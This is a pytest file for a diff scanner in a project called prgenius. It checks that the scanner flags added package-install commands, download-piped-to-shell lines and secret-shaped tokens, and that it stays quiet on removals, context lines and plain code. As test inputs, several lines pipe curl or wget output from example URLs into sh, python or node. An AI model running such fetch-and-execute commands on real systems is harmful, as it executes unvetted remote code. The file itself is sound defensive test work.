"""Diff keyword pass — issue #133.

A scanner that cries wolf is worse than no scanner, so the negative tests here
matter more than the positive ones. Each family has one positive to prove it can
fire; everything else is about proving it stays quiet.
"""

import sys
from pathlib import Path

# 与本仓其它测试一致：包在 prgenius/src 下，直接 import 找不到。
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from prgenius.diff_scan import scan_diff


def _unified(*body: str) -> str:
    return "+++ b/file.py\n" + "\n".join(body) + "\n"


class TestInstallSurface:
    def test_added_install_command_is_reported_with_the_package_name(self):
        result = scan_diff(_unified("+pip install never-existing-package-xyz"))
        assert result["diff_scanned"] is True
        assert result["finding_count"] == 1
        finding = result["findings"][0]
        assert finding["family"] == "install_surface"
        assert "never-existing-package-xyz" in finding["packages"]

    def test_every_supported_installer_can_fire(self):
        for line in (
            "+pip install foo",
            "+pip3 install foo",
            "+pipx install foo",
            "+npm install foo",
            "+npm i foo",
            "+yarn add foo",
            "+pnpm add foo",
            "+go get example.com/foo",
            "+cargo add foo",
        ):
            result = scan_diff(_unified(line))
            assert result["finding_count"] == 1, f"expected a hit for {line!r}, got {result}"
            assert result["findings"][0]["family"] == "install_surface"

    def test_flags_are_not_reported_as_packages(self):
        result = scan_diff(_unified("+pip install -r requirements.txt"))
        packages = result["findings"][0]["packages"]
        assert "-r" not in packages, f"flags leaked into packages: {packages}"

    def test_quoted_package_names_are_unquoted(self):
        """`pip install 'uv[extra]==0.5'` must report `uv`, not `'uv`.

        This is the field the typosquat check exists to produce, so a leading
        quote makes it unlookupable by exact name — the shell quoting has to come
        off before the version/extras trimming does.
        """
        for line, want in (
            ("+pip install 'uv[extra]==0.5.0'", "uv"),
            ('+pip install "requests>=2.0"', "requests"),
            ("+pip install 'never-existing-package-xyz'", "never-existing-package-xyz"),
        ):
            result = scan_diff(_unified(line))
            assert result["finding_count"] == 1, f"{line!r} should fire"
            packages = result["findings"][0]["packages"]
            assert want in packages, f"{line!r} -> {packages}, expected {want!r} among them"
            assert not any(p[:1] in {"'", '"'} for p in packages), (
                f"a quote leaked into a package name: {packages}"
            )

    def test_an_unbalanced_quote_does_not_drop_the_command(self):
        """A malformed quote must not swallow the finding — the command is the point."""
        result = scan_diff(_unified("+pip install 'unterminated"))
        assert result["finding_count"] == 1, "the install surface is still worth reporting"

    def test_version_pins_and_extras_reduce_to_the_distribution_name(self):
        result = scan_diff(_unified("+pip install foo==1.2.3 bar[extra]"))
        packages = result["findings"][0]["packages"]
        assert "foo" in packages
        assert "bar" in packages

    def test_an_install_command_with_no_recognisable_package_still_reports_the_command(self):
        # The command being added is what a reviewer must look at, even when the
        # parser cannot name what it installs.
        result = scan_diff(_unified("+pip install git+https://example.com/x.git"))
        assert result["finding_count"] == 1
        assert result["findings"][0]["rule"] == "pip install"


class TestRemoteExecution:
    def test_download_piped_to_a_shell_is_high_severity(self):
        result = scan_diff(_unified("+curl -fsSL https://example.com/i.sh | sh"))
        assert result["finding_count"] == 1
        finding = result["findings"][0]
        assert finding["family"] == "remote_execution"
        assert finding["severity"] == "high"

    def test_download_piped_to_python_or_node_is_also_caught(self):
        for line in (
            "+curl -fsSL https://example.com/i.py | python",
            "+wget -qO- https://example.com/i.py | python3",
            "+curl https://example.com/i.js | node",
        ):
            assert scan_diff(_unified(line))["finding_count"] == 1, line

    def test_a_download_that_is_only_saved_to_a_file_is_not_flagged(self):
        assert scan_diff(_unified("+curl -fsSL https://example.com/i.sh -o i.sh"))["finding_count"] == 0


class TestSecretShapes:
    def test_an_aws_key_id_is_reported_but_not_echoed(self):
        key = "AKIA" + "A" * 16
        result = scan_diff(_unified(f'+x = "{key}"'))
        assert result["finding_count"] == 1
        finding = result["findings"][0]
        assert finding["family"] == "secret_shaped"
        assert key not in str(result), "the raw key must never appear in the output"
        assert finding["matched"].endswith("chars)")

    def test_a_private_key_block_is_reported(self):
        result = scan_diff(_unified("+-----BEGIN RSA PRIVATE KEY-----"))
        assert result["finding_count"] == 1
        assert result["findings"][0]["rule"] == "private_key_block"

    def test_github_and_openai_shaped_tokens_are_reported(self):
        for line in ("+t = 'ghp_" + "a" * 36 + "'", "+t = 'sk-" + "b" * 30 + "'"):
            assert scan_diff(_unified(line))["finding_count"] == 1, line


class TestNegativeCases:
    """The tests that make this worth having."""

    def test_a_diff_of_plain_code_changes_yields_nothing(self):
        diff = _unified(
            "+def add(a, b):",
            "+    return a + b",
            "+",
            "+VALUE = 42",
        )
        result = scan_diff(diff)
        assert result["diff_scanned"] is True
        assert result["finding_count"] == 0, result["findings"]
        assert result["findings"] == []

    def test_a_removed_install_command_is_not_a_finding(self):
        # `-pip install foo` is a removal. Flagging it would punish exactly the
        # change we want to encourage.
        assert scan_diff(_unified("-pip install foo"))["finding_count"] == 0

    def test_context_lines_are_not_findings(self):
        # Unprefixed lines are context in a unified diff — they are not being added.
        assert scan_diff(_unified(" pip install foo", " curl https://x | sh"))["finding_count"] == 0

    def test_the_file_header_is_not_an_added_line(self):
        assert scan_diff("+++ b/requirements.txt\n")["finding_count"] == 0

    def test_no_diff_means_not_scanned_and_says_so(self):
        result = scan_diff(None)
        assert result["diff_scanned"] is False
        assert result["finding_count"] == 0
        assert "not provided" in result["basis"]
        # the distinction has to survive into the words, not just the flag
        assert "only" in result["basis"]

    def test_an_empty_diff_is_scanned_and_finds_nothing(self):
        result = scan_diff("")
        assert result["diff_scanned"] is True
        assert result["finding_count"] == 0

    def test_the_limitations_are_always_stated(self):
        for diff in (None, "", _unified("+pip install foo")):
            result = scan_diff(diff)
            assert "not a dependency resolver" in result["limitations"]
            assert "not an LLM" in result["limitations"]
